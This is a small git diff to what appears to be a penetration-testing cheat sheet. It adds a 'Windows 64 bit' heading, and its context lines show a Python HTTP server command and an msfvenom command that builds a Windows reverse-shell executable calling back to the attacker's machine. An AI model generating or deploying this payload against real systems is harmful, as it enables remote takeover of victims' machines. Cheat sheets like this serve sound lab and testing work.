@@ -35,6 +35,7 @@ python3 -m http.server 80
 
 ````
 ## MSFVENOM
+### Windows 64 bit
 ````
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
 ````
